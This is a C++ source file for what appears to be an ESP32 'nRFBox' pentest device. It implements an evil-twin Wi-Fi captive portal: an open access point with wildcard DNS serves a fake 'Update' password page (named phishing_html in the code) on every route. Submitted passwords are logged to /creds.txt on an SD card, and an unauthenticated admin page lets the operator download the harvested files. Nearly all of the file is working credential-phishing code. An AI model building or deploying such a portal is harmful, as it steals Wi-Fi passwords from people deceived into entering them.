#include "WebPortalManager.h"

WebPortalManager& WebPortalManager::getInstance() {
    static WebPortalManager instance;
    return instance;
}

WebPortalManager::WebPortalManager() : _server(80), _isRunning(false) {}

void WebPortalManager::start(const char* ssid) {
    if (_isRunning) stop();
    WiFi.mode(WIFI_AP);
    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    char buf[33]; strncpy(buf, ssid, 32); buf[32] = 0;
    WiFi.softAP(buf);
    _dnsServer.start(53, "*", apIP);

    static const char admin_html[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><head><title>nRFBox Admin</title><style>body{font-family:sans-serif;background:#222;color:#fff}table{width:100%}td{padding:8px;border-bottom:1px solid #444}a{color:#0af}</style></head><body><h2>SD Storage</h2><form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='Upload'></form><div id='l'>Loading...</div><script>fetch('/list').then(r=>r.json()).then(j=>{let h='<table>';j.forEach(f=>{h+=`<tr><td>${f.n}</td><td>${f.s}</td><td><a href='/dl?n=${f.n}'>DL</a> <a href='#' onclick='del("${f.n}")'>DEL</a></td></tr>`});document.getElementById('l').innerHTML=h+'</table>'});function del(n){if(confirm('Delete '+n+'?'))fetch('/del?n='+n,{method:'DELETE'}).then(()=>location.reload())}</script></body></html>)rawliteral";
    static const char phishing_html[] PROGMEM = R"rawliteral(<!DOCTYPE html><html><body><h2>Update</h2><form action="/login" method="POST"><input type="password" name="p"><button>OK</button></form></body></html>)rawliteral";

    _server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200, "text/html", phishing_html); });
    _server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200, "text/html", admin_html); });
    
    _server.on("/login", HTTP_POST, [this](AsyncWebServerRequest *r){
        if (r->hasParam("p", true)) {
            String p = r->getParam("p", true)->value();
            if(p.length() >= 8) {
                saveCreds(WiFi.softAPSSID().c_str(), p.c_str());
                r->send(200, "text/html", "Updating...");
            } else r->send(200, "text/html", "Error: Short Password");
        }
    });

    _server.on("/list", HTTP_GET, [](AsyncWebServerRequest *r){
        String json = "[";
        if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(1000))) {
            if(SD.begin(Config::PIN_SD_CS)) {
                File root = SD.open("/");
                File file = root.openNextFile();
                bool first = true;
                while(file){
                    if(!first) json += ",";
                    json += "{\"n\":\"" + String(file.name()) + "\",\"s\":\"" + String(file.size()) + "\"}";
                    first = false;
                    file = root.openNextFile();
                }
            }
            xSemaphoreGive(g_spiMutex);
        }
        json += "]";
        r->send(200, "application/json", json);
    });

    _server.on("/dl", HTTP_GET, [](AsyncWebServerRequest *r){
        if(r->hasParam("n")){
            if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(1000))) {
                r->send(SD, r->getParam("n")->value(), "application/octet-stream");
                xSemaphoreGive(g_spiMutex);
            } else r->send(503);
        }
    });

    _server.on("/del", HTTP_DELETE, [](AsyncWebServerRequest *r){
         if(r->hasParam("n")){
            String path = r->getParam("n")->value();
            if(!path.startsWith("/")) path = "/" + path;
            if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(1000))) {
                SD.remove(path);
                xSemaphoreGive(g_spiMutex);
                r->send(200);
            }
         }
    });

    _server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *r){ r->send(200); }, 
    [](AsyncWebServerRequest *r, String filename, size_t index, uint8_t *data, size_t len, bool final){
        if(!index) {
            if(!filename.startsWith("/")) filename = "/" + filename;
            if(xSemaphoreTake(g_spiMutex, 1000)) {
                r->_tempFile = SD.open(filename, FILE_WRITE);
                xSemaphoreGive(g_spiMutex);
            }
        }
        if(r->_tempFile && xSemaphoreTake(g_spiMutex, 100)) {
            r->_tempFile.write(data, len);
            xSemaphoreGive(g_spiMutex);
        }
        if(final && r->_tempFile) {
            if(xSemaphoreTake(g_spiMutex, 100)) {
                r->_tempFile.close();
                xSemaphoreGive(g_spiMutex);
            }
        }
    });

    _server.onNotFound([](AsyncWebServerRequest *r){ r->send_P(200, "text/html", phishing_html); });
    _server.begin(); 
    _isRunning = true;
}

void WebPortalManager::stop() {
    if (_isRunning) { _dnsServer.stop(); _server.end(); WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA); _isRunning = false; }
}

void WebPortalManager::processDns() { if (_isRunning) _dnsServer.processNextRequest(); }
bool WebPortalManager::isRunning() const { return _isRunning; }

void WebPortalManager::saveCreds(const char* ssid, const char* pass) {
    char log[128]; snprintf(log, 128, "SSID: %s | PASS: %s\n", ssid, pass);
    if (xSemaphoreTake(g_spiMutex, 500)) {
        if (SD.begin(Config::PIN_SD_CS)) {
            File f = SD.open("/creds.txt", FILE_APPEND);
            if (f) { f.write((uint8_t*)log, strlen(log)); f.close(); }
        }
        xSemaphoreGive(g_spiMutex);
    }
}